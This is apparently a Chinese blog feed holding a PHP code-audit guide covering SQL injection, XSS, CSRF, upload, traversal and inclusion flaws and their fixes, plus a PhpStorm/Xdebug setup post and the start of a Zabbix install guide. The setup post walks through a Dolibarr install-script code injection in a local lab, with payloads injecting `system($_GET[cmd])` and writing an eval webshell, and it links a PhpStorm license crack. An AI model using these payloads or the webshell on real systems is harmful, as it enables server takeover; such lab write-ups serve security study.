rawurldecode 找到二次url漏洞。</p><p><strong>SQL 注入漏洞防范方法</strong><br>虽然SQL注入漏洞非常多，但是防范起来却挺简单的，下面介绍几个过滤函数和类:<br>gpc/rutime 魔术引号<br>过滤函数和类<br>addslashes<br>mysql_real_escape_string<br>intval<br>PDO 预处理  </p><p><strong>SQL注入过程</strong>  </p><ol><li>攻击者访问登录页面  </li><li>输入用户名及密码  </li><li>将含有攻击字符串组成SQL语句转发给数据库执行  </li><li>数据库执行发回应用程序服务器  </li><li>应用程序将内容返回浏览器，即绕过成功  </li></ol><h4 id="XSS（Cross-Site-Scripting）"><a href="#XSS（Cross-Site-Scripting）" class="headerlink" title="XSS（Cross-Site Scripting）"></a>XSS（Cross-Site Scripting）</h4><p>跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。<br>XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。在 WEB2.0 时代，强调的是互动，使得用户输入信息的机会大增，在这个情况下，我们作为开发者，在开发的时候，要提高警惕。<br><img src="/images/代码审计/6.png" alt="upload successful"></p><p><strong>xss 漏洞分类</strong><br>1.反射型，危害小，一般<br>反射型XSS原理：就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。比如hack甲构造好修改密码的URL并把密码修改成123，但是修改密码只有在登陆方乙才能修改，乙在登陆的情况下点击甲构造好的URL将直接在不知情的情况下修改密码。<br>特点是：非持久化，必须用户点击带有特定参数的链接才能引起。<br>反射型XSS是比较普遍的XSS，其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重，如在输入框的name中输入<meta http="" equiv="refresh" content="5">，服务器不加处理，将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。  </p><p>2.存储型，危害大，影响时间长<br>存储型XSS原理，假设你打开了一篇正常的文章页面，下面有评论功能。这个时候你去评论了一下，在文本框中输入了一些JavaScript代码，提交之后,你刷新这个页面后发现刚刚提交的代码又被原封不动的返回来并且执行了。<br>这个时候你会想,我要写一段 JavaScript 代码获取 cookie 信息，然后通过ajax发送到自己的服务器去。构造好代码后你把链接发给其他的朋友，或者网站的管理员，他们打开 JavaScript 代码就执行了，你服务器就接收到了sessionid，你就可以拿到他的用户权限了。</p><p>3.dom型，特殊的一种<br>dom型 XSS 是因为 JavaScript 执行了dom 操作，所造成的 XSS 漏洞，具体如下图。可以看到虽然经过 html 转义了，但是这块代码在返回到 html 中，又被 JavaScript 作为 dom 元素操作。那当我输入如下代码的时候依然会存在 XSS 漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure></p><p><strong>漏洞思路：搜索内容、发表文章、留言、评论回复</strong></p><p><strong>xss 漏洞挖掘方法</strong><br>根据上面的一些特点，可以总结出几个分析出几个挖掘方法：<br>数据接收位置，检查 _POST、$_COOKIE是否经过转义。<br>常见的反射型XSS搜索这种类似位置发现次数较多。<br>而存储型在文章，评论出现比较多。</p><p><strong>XSS 漏洞防范方法</strong><br>1.转义html实体，有两种方式：在入口和出口,我建议是在入口处转义，防止出口位置取出来的时候忘记转义，如果已经在入口转义了，出口位置就不用再次转义。<br>2.在富文本编辑器中，经常会用到一些元素的属性，比如上图的onerror，那我们还需对元素的属性建立黑白名单。<br>3httpOnly 即使存在xss漏洞，可以把危害大大降低。<br>4.对所有输入中的script、iframe等字样进行严格的检查<br>5.验证数据的类型及其格式、长度、范围和内容<br>6.客户端做数据的验证与过滤，关键的过滤步骤在服务端进行检查<br>7.入参和出参校验<br>(1)“&lt;  &gt;” 可以引入一个标签或者结束一个标签。<br>(2) “&amp;” 可以引入一个字符实体。<br>(3)对于外加双引号的属性值，双引号(””)是特殊字符，因为它们标记了该属性值的结束。<br>(4) 对于外加单引号的属性值，单引号(‘’)是特殊字符，因为它们标记了该属性值的结束<br>8.URL重定向校验<br>（1）空格符、制表符和换行符标记了 URL 的结束。<br>（2） “&amp;” 引入一个字符实体<br>（3）非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。<br>（4）在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。</p><h4 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h4><p><strong>CSRF 漏洞介绍</strong><br>CSRF（Cross-site request forgery）跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户。<br>而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br>csrf 主要用来做越权操作，而且 csrf 一直没有被关注起来，所以很多程序现在也没有相关的防范措施。</p><p><strong>漏洞危害</strong><br>攻击者盗用了你的身份信息，以你的名义发送恶意请求。<br>以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等<br>造成的问题包括：个人隐私泄露以及财产安全。</p><p><strong>CSRF 案例</strong><br>我们来看下面的一段代码,这个表单当被访问到的时候，用户就退出了登录。假设有一个转账的表单，只需要填写对方的用户名，和金额就可以，那如果我提前把 URL 构造好，发给受害者，当点击后，钱就被转走了。<br>或者我把这个 URL 放到我的网页中，通过&lt;img src=”我构造的URL” ，当其他人打开我的网址后，就中招了。</p><p><strong>攻击流程</strong><br><img src="/images/代码审计/7.png" alt="upload successful"></p><p><strong>CSRF漏洞挖掘方法</strong><br>通过上面的描述，我们知道了漏洞的原有，那我们审计的时候可以检查处理表单有没有以下判断。<br>是否有验证 token。<br>是否有图片验证码。<br>是否有 refe 信息。<br>如果三个判断都没有，那么就存在了 CSRF 漏洞，CSRF 不仅限于 GET 请求， POST 请求同样存在。<br>CSRF 漏洞防范方法<br>图片验证码，这个想必大家都知道，但是用户体验并不好，我们可以看下面的一些处理方法。<br>token验证。<br>token验证方法如下，每次访问表单页的时候，生成一个不可预测的token存放在服务器session中，另外一份放页面中，提交表单的时候需要把这个token带过去，接收表单的时候先验证一下token是否合法。<br>Referer信息验证<br>大多数情况下，浏览器访问一个地址，其中header头里面会包含Referer信息,里面存储了请求是从哪里发起的。<br>如果HTTP头里包含有Referer的时候，我们可以区分请求是同域下还是跨站发起的，所以我们也可以通过判断有问题的请求是否是同域下发起的来防御 CSRF 攻击。<br>Referer 验证的时候有几点需要注意，如果判断Referer是否包含 *.XXX.com,如果有子域名有漏洞，会存在绕过的可能。<br>如果判断的条件的是Referer中是否包含字符 ‘xxx.com’  那攻击者在他目录中建立一个 xxx.com 文件夹同样存在绕过的可能。如果可以最合适的判断是，直接判断是否等于当前域名。</p><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><p><strong>漏洞危害</strong><br>上传文件的时候，服务器端脚本语言未对上传的文件进行严格的验证和过滤，就有可能上传恶意的文件，从而控制整个网站，甚至是服务器。</p><p><strong>漏洞条件</strong><br>文件可以上传、知道文件上传的路径、上传文件可以被访问、上传文件可以被执行</p><p><strong>文件上传可控点</strong><br>Content-Length,即上传内容大小<br>MAX_FILE_SIZE,即上传内容的最大长度<br>filename,即上传文件名<br>Content-Type,即上传文件类型<br>请求包中的乱码字段，即是所上传文件的内容<br>有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</p><p><strong>挖掘思路</strong><br>上传点都调用同一个上传类，直接全局搜索上传函数<br>黑盒寻找上传点，代码定位</p><p><strong>代码案例</strong><br>name：客户端的原始上传文件名称<br>Type：上传文件的MIME类型<br>Tmp_name：服务器端用来保存上传文件的临时文件路径<br>Error：上传文件时的错误信息<br>Size：上传文件的大小，单位</p><p><strong>文件上传绕过客户端</strong><br>用firebug将form表单中的onsubmit事件删除<br>上传木马文件，Burp拦截数据包，修改扩展名</p><p><strong>文件上传绕过服务端</strong><br>黑白名单过滤<br>修改MIME类型<br>截断上传攻击<br>.htaccess文件攻击<br>目录验证</p><p><strong>防护方案</strong><br>检测文件上传内容<br>黑白名单验证，检测文件扩展名是否合法<br>MIME验证，检测文件的MIME类型<br>限制文件大小<br>更改临时文件夹的路径<br>读取上传文件的绝对路径与文件名称<br>隐藏文件路面</p><h4 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h4><p><img src="/images/代码审计/8.png" alt="upload successful"></p><h4 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h4><p>目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上，任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击，也有人称为Path Traversal攻击。</p><p><strong>漏洞危害</strong><br>攻击者可以使用目录穿越攻击来查找、执行或存取Web应用程序所在的根目录以外的文件夹。如果目录穿越攻击成功，黑客就可以执行破坏性的命令来攻击网站。</p><p><strong>绕过方式</strong><br>进行URL编码<br>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</p><p>进行16为Unicode编码<br>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</p><p>进行双倍URL编码<br>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</p><p>进行超长UTF-8 Unicode编码点–&gt;%c0%2e %e0$40%ae %c0ae 反斜杠–&gt;%c0af %e0%80af %c0%af 正斜杠–&gt;%c0%5c %c0%80%5c</p><p><strong>修复方案</strong><br>在URL内不要使用文件名称作为参数<br>检查使用者输入的文件名是否有“..”的目录阶层字符<br>在php.ini文件中设置open_basedir来指定文件的目录<br>使用realpath函数来展开文件路径中的“./”、 “../”等字符，然后返回绝对路径名称<br>使用basename函数来返回不包含路径的文件名称</p><h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。</p><p><strong>漏洞危害</strong><br>执行恶意代码<br>包含恶意文件控制网站<br>甚至控制网站服务器等</p><p><strong>本地包含</strong><br>本地文件包含（Local File Include，LFI），LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。</p><p><strong>远程包含</strong><br>远程文件包含（Remote File Include，RFI）， RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On，四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用，出现的频率没有本地包含多。</p><p><strong>挖掘经验</strong><br>模块加载、cache调用，传入的参数拼接包含路径<br>include()<br>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p><p>inclue_once()<br>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p><p> require()<br>使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p><p> require_once()<br>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p><p><strong>修复方案</strong><br>关闭远程包含参数开关，彻底切断这个业务相比较<br>设置类似白 名单的方法，筛选固定文件名<br>常见目录穿越字符进行过滤，如（./  .//  ..\等）</p><h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感信息文件，正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件</p><p><strong>漏洞危害</strong><br>任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p><p><strong>挖掘经验</strong><br>fopen()<br>file_get_contents()<br>fread<br>fgets      allow_url_fopen选项激活了 URL 形式的 fopen 封装协议<br>fgetss   使得可以访问 URL 对象例如文件。默认的封装协议提供用<br>ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可<br>file   能会注册更多的封装协议</p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>攻击者从寻找上删除的功能，正常删除功能的文件没有经过校验或者不严格，攻击者控制这个可操作的变量配合目录遍历进行删除其他文件</p><p><strong>unlink函数</strong>  </p><p><strong>修复方案</strong><br>正则严格判断用户参数的格式<br>检查使用者输入的文件名是否有 “..” 的目录阶层字符<br>在php.ini文件中设置open_basedir来限定文件访问范围</p><h3 id="0x06-常规漏洞的防范方法"><a href="#0x06-常规漏洞的防范方法" class="headerlink" title="0x06 常规漏洞的防范方法"></a>0x06 常规漏洞的防范方法</h3><h4 id="taint-PHP-安全扩展"><a href="#taint-PHP-安全扩展" class="headerlink" title="taint PHP 安全扩展"></a>taint PHP 安全扩展</h4><p><strong>功能介绍</strong><br>Taint 可以用来检测隐藏的 XSS code, SQL 注入， Shell注入等漏洞，并且这些漏洞如果要用静态分析工具去排查， 将会非常困难， 我们来看下面这张图:<br><img src="/images/代码审计/9.png" alt="upload successful"><br><strong>安装方法</strong><br>下载 taint：  <a href="http://pecl.php.net/package/taint" target="_blank" rel="noopener">http://pecl.php.net/package/taint</a></p><p><strong>配置</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/php/bin/phpize</span><br><span class="line">./configure --with-php-config=/usr/local/php/bin/php-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>更加详细的可以参考：<a href="http://www.cnblogs.com/linzhenjie/p/5485474.html" target="_blank" rel="noopener">http://www.cnblogs.com/linzhenjie/p/5485474.html</a><br>应用场景<br>开发团队要求每个人都做到非常的安全比较难，但是把taint安装在开发环境，特别适合，一看到 warning 信息一般都回去改。</p><h4 id="ngx-lua-waf"><a href="#ngx-lua-waf" class="headerlink" title="ngx_lua_waf"></a>ngx_lua_waf</h4><p><strong>功能介绍</strong><br>防止 sql 注入，本地包含，部分溢出，fuzzing 测试，xss，SSRF 等 web攻击。<br>防止 svn /备份之类文件泄漏。<br>防止 ApacheBench 之类压力测试工具的攻击。<br>屏蔽常见的扫描黑客工具，扫描器。<br>屏蔽异常的网络请求。<br>屏蔽图片附件类目录 php 执行权限。<br>防止 webshell 上传。<br><strong>安装方法</strong><br>安装依赖: luajit 、ngx_devel_kit、nginx_lua_module<br>安装nginx、ngx_lua_waf<br>在nginx.conf里的 http 添加配置<br>详细安装文档<br><strong>效果图</strong><br><img src="/images/代码审计/10.png" alt="upload successful"></p><h3 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h3><p><a href="https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zg</a><br><a href="http://www.cnblogs.com/linzhenjie/p/5485474.html" target="_blank" rel="noopener">http://www.cnblogs.com/linzhenjie/p/5485474.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;工欲善其事，必先利其器。我们做代码审计之前选好工具也是十分必要的。下面我给大家介绍两款代码审计中比较好用的工具。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Phpstorm+phpstudy+xdebug+Dolibarr</title>
    <link href="http://yoursite.com/2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/"/>
    <id>http://yoursite.com/2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/</id>
    <published>2018-08-11T15:20:00.000Z</published>
    <updated>2018-08-11T15:46:28.358Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。</p></blockquote><a id="more"></a><h3 id="【准备】"><a href="#【准备】" class="headerlink" title="【准备】"></a>【准备】</h3><p><strong>先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考<a href="https://blog.csdn.net/finish_dream/article/details/80045514" target="_blank" rel="noopener">https://blog.csdn.net/finish_dream/article/details/80045514</a> 亲测有效。</strong></p><h3 id="【配置步骤】"><a href="#【配置步骤】" class="headerlink" title="【配置步骤】"></a>【配置步骤】</h3><p><strong>进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。</strong></p><p><strong>1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。</strong></p><p><img src="/images/pasted-50.png" alt="upload successful"></p><p><strong>2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line"></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.trace_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.auto_trace=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_params=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_return=1</span><br><span class="line"></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.profiler_enable = 1</span><br><span class="line"></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line"></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line"></span><br><span class="line">xdebug.remote_handler = &quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line"></span><br><span class="line">xdebug.remote_host = &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_port = 9000</span><br></pre></td></tr></table></figure><p><strong>3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。</strong></p><p><img src="/images/pasted-51.png" alt="upload successful"></p><p>open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。</p><p><img src="/images/pasted-52.png" alt="upload successful"></p><p><strong>4.选择PHP的版本信息。</strong></p><p><img src="/images/pasted-54.png" alt="upload successful"></p><p>Debug端口设置</p><p><img src="/images/pasted-55.png" alt="upload successful"></p><p>IDEKEY：</p><p><img src="/images/pasted-56.png" alt="upload successful"></p><p>配置PHP Web Application</p><p><img src="/images/pasted-57.png" alt="upload successful"></p><p>查看配置：</p><p><img src="/images/pasted-58.png" alt="upload successful"></p><p>xdebug配置完成了</p><p><strong>3.实现截取操作</strong></p><p>在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。</p><p><img src="/images/pasted-59.png" alt="upload successful"></p><p>在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。</p><p><img src="/images/pasted-60.png" alt="upload successful"></p><p>选择一个浏览器打开写好的文件</p><p><img src="/images/pasted-61.png" alt="upload successful"></p><p>截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了。</p><p><img src="/images/pasted-62.png" alt="upload successful"></p><h4 id="Dolibarr-ERP-CRM-php代码注入漏洞"><a href="#Dolibarr-ERP-CRM-php代码注入漏洞" class="headerlink" title="Dolibarr ERP/CRM php代码注入漏洞"></a>Dolibarr ERP/CRM php代码注入漏洞</h4><p><strong>Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。</strong></p><p><strong>1、先配置好Dolibarr环境。</strong></p><p>将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。</p><p><img src="/images/pasted-63.png" alt="upload successful"><br>然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。</p><p><img src="/images/pasted-64.png" alt="upload successful"></p><p>打开浏览器输入127.0.0.1/install</p><p><img src="/images/pasted-65.png" alt="upload successful"></p><p>然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。</p><p><img src="/images/pasted-66.png" alt="upload successful"></p><p>安装完毕后，会在Phpstrom中自动截取到step1.php的文件。</p><p><img src="/images/pasted-67.png" alt="upload successful"></p><p><strong>2、开始代码的修改。</strong></p><p>step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法</p><p><img src="/images/pasted-68.png" alt="upload successful"></p><p>按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。</p><p><img src="/images/pasted-69.png" alt="upload successful"></p><p>ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。</p><p><img src="/images/pasted-70.png" alt="upload successful"></p><p>继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。</p><p><img src="/images/pasted-71.png" alt="upload successful"></p><p>继续往下走，直接定位到写入数据库名称的代码段</p><p><img src="/images/pasted-72.png" alt="upload successful"></p><p>提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。</p><p>数据库名称改为dolibarr \’;phpinfo();//</p><p><img src="/images/pasted-73.png" alt="upload successful"></p><p>配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止</p><p><img src="/images/pasted-74.png" alt="upload successful"></p><p>Ø通过包含此文件的文件去间接的执行代码</p><p><img src="/images/pasted-75.png" alt="upload successful"></p><p>更改payload，执行系统命令并getshell</p><p><img src="/images/pasted-76.png" alt="upload successful"></p><p>将db_name改为dolibarr \’;system($_GET[cmd]);//</p><p><img src="/images/pasted-77.png" alt="upload successful"></p><p>访问/insex.php?cmd={command}</p><p><img src="/images/pasted-79.png" alt="upload successful"></p><p>修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php</p><p><img src="/images/pasted-82.png" alt="upload successful"></p><p>请求后会在网站根目录下生成一句话木马，尝试用菜刀连接</p><p><img src="/images/pasted-80.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix可视化监控的搭建</title>
    <link href="http://yoursite.com/2018/08/10/Zabbix%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2018/08/10/Zabbix可视化监控的搭建/</id>
    <published>2018-08-10T12:07:00.000Z</published>
    <updated>2018-08-13T13:51:49.833Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。</p></blockquote><a id="more"></a><h3 id="0x01-【操作环境】"><a href="#0x01-【操作环境】" class="headerlink" title="0x01 【操作环境】"></a>0x01 【操作环境】</h3><p>CentOS Linux release 7.5.1804 (Core)<br>zabbix版本：zabbix-3.4.12</p><h3 id="0x02-【环境准备】"><a href="#0x02-【环境准备】" class="headerlink" title="0x02 【环境准备】"></a>0x02 【环境准备】</h3><p><strong>1、LAMP安装和启动：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache安装：yum install http* -y  </span><br><span class="line">Apache启动：systemctl start httpd  </span><br><span class="line">Mariadb安装：yum install mariadb-server mariadb -y  </span><br><span class="line">Mariadb启动：systemctl start mariadb.service  </span><br><span class="line">PHP安装：yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php-bcmath -y</span><br></pre></td></tr></table></figure></p><p><strong>LAMP安装参考资料：<a 